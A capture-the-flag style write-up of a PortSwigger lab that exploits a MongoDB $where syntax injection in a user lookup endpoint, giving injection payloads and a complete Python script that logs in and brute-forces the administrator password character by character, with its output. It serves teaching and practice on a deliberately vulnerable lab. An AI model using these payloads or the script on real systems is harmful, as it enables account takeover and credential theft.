# Exploiting NoSQL injection to extract data

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data), you'll learn: Exploiting NoSQL injection to extract data! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to [NoSQL injection](https://portswigger.net/web-security/nosql-injection).

To solve the lab, extract the password for the `administrator` user, then log in to their account.

You can log in to your own account using the following credentials: `wiener:peter`.

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009145759.png)

In here, we can view and purchase some products.

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009145825.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009145854.png)

**In the profile page, it'll import a JavaScript file called `userRole.js` at `/resources/js/`:**
```html
[...]
<div id=account-content>
    <div id="user-details">
        <p id="username">Your username is: wiener</p>
        <p>Your email is: <span id="user-email"></span></p>
        <script src='/resources/js/userRole.js'></script>
    </div>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <input required type="hidden" name="csrf" value="MHCAoDqK8lnYGrP1i1nEDMxtkAouj2s9">
        <button class='button' type='submit'> Update email </button>
    </form>
</div>
[...]
```

**`userRole.js`:**
```javascript
const appendFromUser = (user) => {
    const email = user.email;
    if (email) {
        document.querySelector("#user-details #user-email").textContent = email;
    }

    const role = user.role;
    if (role) {
        document.querySelector("#user-details #username").textContent += ` (role: ${role})`;
    }
};

const appendUserDetails = () => {
    const url = new URL(location);

    fetch(`//${url.host}/user/lookup?user=${encodeURIComponent(url.searchParams.get('id'))}`)
        .then(res => res.json())
        .then(appendFromUser);
};

appendUserDetails();
```

When the GET parameter `id` is provided in the `/my-account` endpoint, **it'll send a GET request to `/user/lookup?user=<id>`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009150224.png)

Hmm... **I wonder if this endpoint's `id` GET parameter is vulnerable to NoSQL injection...**

**Now, what if I insert a single quote (`'`) or a double quote (`"`) character?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009150518.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009150532.png)

If we provide a single quote character, it respond "There was an error getting user details", and double quote respond "Could not find user".

That being said, we found a **syntax injection in `/user/lookup?user=<id>`!**

## Exploitation

**Exploiting syntax injection to extract data:**

In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.

**Exfiltrating data in MongoDB:**

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:

```
https://insecure-website.com/user/lookup?username=admin
```

This results in the following NoSQL query of the `users` collection:

```json
{
    "$where": "this.username == 'admin'"
}
```

As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:

```javascript
admin' && this.password[0] == 'a' || 'a'=='b
```

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:

```javascript
admin' && this.password.match(/\d/) || 'a'=='b
```

Armed with above information, we can try to extract user `administrator` account's password!

**But before we do that, I want to confirm the `administrator` account is really exist or not:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009151107.png)

It does exist!

Then, since the lookup function is vulnerable to syntax injection, **we should be able to extract the database's data with the help of the `$where` operator.**

```javascript
administrator' && this.password[0] == '<character_here>' || 'a'=='b
```

> Note: We could assume the password field is called `password`.

**If we try the first character is `a`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009151552.png)

It respond "Could not find user".

**But if we find the first correct character, it'll response us with the user's details:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009151654.png)

**To automate this process, we can write a simple Python script to extract user `administrator`'s password!**

**However, let's see if we still be able to lookup any user without authentication:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009152019.png)

Nope. So we need to be authenticated.

**Therefore, we can write the following script:**
```python
import requests
from bs4 import BeautifulSoup
from string import ascii_letters

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.Session()

    def getCSRFToken(self):
        print('[*] Fetching the CSRF token...')
        global LOGIN_ENDPOINT
        LOGIN_ENDPOINT = '/login'
        csrfTokenRespond = self.session.get(f'{self.baseUrl}{LOGIN_ENDPOINT}')
        
        soup = BeautifulSoup(csrfTokenRespond.text, 'html.parser')
        csrfToken = soup.find('input', {'name':'csrf'}).get('value')
        sessionCookie = self.session.cookies.get_dict()['session']
        print(f'[+] Fetched the CSRF token: {csrfToken}')
        print(f'[+] Session cookie: {sessionCookie}')
        return csrfToken

    def login(self):
        csrfToken = self.getCSRFToken()
        username = 'wiener'
        password = 'peter'
        loginData = {
            'csrf': csrfToken,
            'username': username,
            'password': password
        }
        print('[*] Logging in to the web application...')
        loginRespond = self.session.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', data=loginData)
        if loginRespond.status_code == 400:
            print('[-] Login failed... Maybe the CSRF token is incorrect?')
            print(f'[-] Response text:\n{loginRespond.text}')
            exit(1)
        print('[+] Login successfully!')

    def extractData(self):
        USER_LOOKUP_ENDPOINT = '/user/lookup'
        USER_LOOK_PARAMETER = 'user'
        TARGET_USERNAME = 'administrator'
        LAST_CHARACTER = ascii_letters[-1]
        print(f'[*] Extracting {TARGET_USERNAME}\'s password...')
        password = ''
        stringPosition = 0
        while True:
            for character in ascii_letters:
                print(f'[*] Trying character "{character}"...', end='\r')
                payload = requests.utils.quote(f"{TARGET_USERNAME}' && this.password[{stringPosition}] == '{character}' || 'a'=='b")
                userLookupRespond = self.session.get(f'{self.baseUrl}{USER_LOOKUP_ENDPOINT}?{USER_LOOK_PARAMETER}={payload}')
                userLookupRespondJson = userLookupRespond.json()
                isLastCharacter = character == LAST_CHARACTER
                if 'message' in userLookupRespondJson:
                    if isLastCharacter:
                        print('[-] Looped all possible characters, no luck. Maybe we found all the password characters?')
                        print(f'[*] Password: {password}')
                        exit(1)
                    continue
                stringPosition += 1
                password += character
                print(f'[+] Found correct character "{character}". Current password: {password}')
                break

if __name__ == '__main__':
    baseUrl = 'https://0ade00e60326fdd58cade324003900c8.web-security-academy.net'
    exploit = Exploit(baseUrl)

    exploit.login()
    exploit.extractData()
```

This script will basically loop through all possible characters (including lower and upper case alphabet) to find the correct password.

**Output:**
```shell
┌[siunam♥Mercury]-(~/ctf/Portswigger-Labs/NoSQL-Injection/NoSQLi-3)-[2023.10.09|16:01:18(HKT)]
└> python3 extract_data.py
[*] Fetching the CSRF token...
[+] Fetched the CSRF token: yWGh7t8Bdtt2W5bpqn2F89M2quAV1wEn
[+] Session cookie: zRZ9yAEKQidKlpEOnFofw8wN2yPe4p7c
[*] Logging in to the web application...
[+] Login successfully!
[*] Extracting administrator's password...
[+] Found correct character "w". Current password: w
[+] Found correct character "n". Current password: wn
[+] Found correct character "o". Current password: wno
[+] Found correct character "u". Current password: wnou
[+] Found correct character "q". Current password: wnouq
[+] Found correct character "v". Current password: wnouqv
[+] Found correct character "n". Current password: wnouqvn
[+] Found correct character "u". Current password: wnouqvnu
[-] Looped all possible characters, no luck. Maybe we found all the password characters?
[*] Password: wnouqvnu
```

**After extracting the password, we can logout our `wiener` user account, and log back in to the `administrator` account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009160652.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/NoSQL-Injection/NoSQLi-3/images/Pasted%20image%2020231009160657.png)

Nice! I'm now user `administrator`!

## Conclusion

What we've learned:

1. Exploiting NoSQL injection to extract data